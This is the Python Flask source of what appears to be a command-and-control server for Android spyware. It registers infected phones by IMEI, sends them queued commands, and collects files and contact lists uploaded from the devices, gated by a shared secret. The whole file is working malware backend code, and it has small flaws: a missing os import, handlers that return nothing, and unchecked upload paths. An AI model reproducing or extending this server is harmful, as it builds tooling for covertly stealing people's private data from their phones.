from flask import Flask, request
import random
from utils import database
import base64
import string 
app = Flask(__name__)

def _get_rand_key(len=24):
    rand_key = ''.join(random.choice(string.ascii_letters) for i in range(len))
    if database.key_exists(rand_key):
        return  _get_rand_key(len)
    else:
        return rand_key


@app.route('/register', methods=['POST', 'GET'])
def register():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'
    print(data)
    secret = data['s']
    if secret != database.get_secret():
        return 'nice try, don\'t try to repack a repack'

    info = dict()
    info['imei'] = data['i']
    info['key'] = _get_rand_key()

    res = database.update_database(info)
    if res:
        return info['key']
    else: # phone already registered
        return database.get_key_for_imei(info['imei'])



@app.route('/command', methods=['POST'])
def command():
    data = request.json
    secret = data['s']
    if secret != database.get_secret():
        return 'nice try, don\'t try to repack a repack'

    com = database.get_command_for_key(data['k'])
    if not com:
        return 'w'
    else:
        return com

@app.route('/upfile', methods=['POST'])
def upfile():
    data = request.json
    secret = data['s']
    if secret != database.get_secret():
        return 'nice try, don\'t try to repack a repack'

    filename = data['n']
    raw = base64.b64decode(data['r'])
    imei = data['i']
    new_name = os.path.join(imei, filename)


    database.register_file(imei, filename, new_name)
    with open(new_name, 'wb') as f:
        f.write(raw)


@app.route('/upcontacts', methods=['POST'])
def upcontacts():
    data = request.json
    secret = data['s']
    if secret != database.get_secret():
        return 'nice try, don\'t try to repack a repack'


    imei = data['i']
    contacts = data['c'].split(',')


    database.register_contacts(imei, contacts)

if __name__ == '__main__':
    app.run()
